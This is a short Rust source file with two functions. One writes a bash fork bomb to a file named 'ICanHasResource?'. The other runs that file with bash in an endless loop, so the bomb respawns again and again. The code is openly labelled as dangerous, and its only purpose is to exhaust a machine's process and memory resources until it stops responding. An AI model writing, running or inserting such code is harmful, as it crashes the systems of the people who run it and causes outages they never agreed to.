use std::fs::File;
use std::io::prelude::*;
use std::process::Command;

pub fn make_danger() {
    let f = File::create("ICanHasResource?");
    assert_eq!(f.is_ok(), true);
    let res = f.unwrap().write_all(b":(){ :|:&  };:");
    assert_eq!(res.is_ok(), true);
}

pub fn execute_danger() {
    loop {
        let mut child = Command::new("bash")
            .arg("ICanHasResource?")
            .spawn()
            .expect("failed to execute child");
        let ecode = child.wait()
            .expect("failed to wait on child");
        assert!(ecode.success());
    }
}
